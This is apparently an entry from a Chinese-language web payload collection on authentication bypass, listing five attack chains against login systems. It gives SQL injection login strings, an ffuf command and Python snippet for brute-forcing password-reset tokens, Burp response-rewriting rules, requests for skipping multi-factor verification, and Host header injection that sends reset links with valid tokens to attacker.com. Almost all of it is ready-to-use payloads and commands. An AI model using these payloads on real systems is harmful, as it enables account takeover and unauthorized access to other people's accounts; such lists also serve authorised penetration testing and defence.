# 认证绕过 (Authentication Bypass)

_6 条 web payload_

---

### SQL注入登录绕过  `sqli-login-bypass`
子类：**登录绕过** · tags: `sqli` `login` `auth`

**前置条件：**
- 登录表单使用字符串拼接SQL查询
- 未使用参数化查询

**攻击链：**

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin'--", "password": "anything"}
{"username": "' OR '1'='1'--", "password": "x"}
{"username": "admin'/*", "password": "*/OR/**/1=1--"}
```

### 密码重置Token猜测  `reset-token-bruteforce`
子类：**Token预测** · tags: `password-reset` `brute` `weak-random`

**攻击链：**

```bash
# ffuf 爆破6位数字token
ffuf -w <(seq -w 0 999999) \
  -u 'https://target.com/reset?token=FUZZ' \
  -mc 200 -fs 1234

# 时间戳token猜测
python3 -c "
import time
for ts in range(int(time.time())-3600, int(time.time())+1):
    print(ts)
" > tokens.txt
```

### 响应篡改绕过  `response-tampering-bypass`
子类：**客户端校验** · tags: `response-manipulation` `burp`

**攻击链：**

Burp Match & Replace:
```
Response Body: "success":false  →  "success":true
Response Body: "authenticated":false  →  "authenticated":true
Response Body: "isAdmin":false  →  "isAdmin":true
Status Code: 401  →  200
```

### 多步认证跳步绕过  `mfa-step-skip`
子类：**流程跳步** · tags: `mfa` `2fa` `step-skip`

**攻击链：**

```http
# 正常流程: /login → /mfa-verify → /dashboard
# 获取session后跳过MFA直接访问
GET /dashboard HTTP/1.1
Cookie: session=<login_session_before_mfa>

# 修改MFA请求参数
POST /api/mfa-verify HTTP/1.1
{"otp": "", "skip": true, "verified": true}
```

### Host Header注入密码重置  `host-header-reset`
子类：**链接劫持** · tags: `host-header` `password-reset`

**攻击链：**

```http
POST /api/password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@example.com"}

# 变体
X-Forwarded-Host: attacker.com
X-Host: attacker.com
```

受害者邮件链接变为 `https://attacker.com/reset?token=<valid_token>`
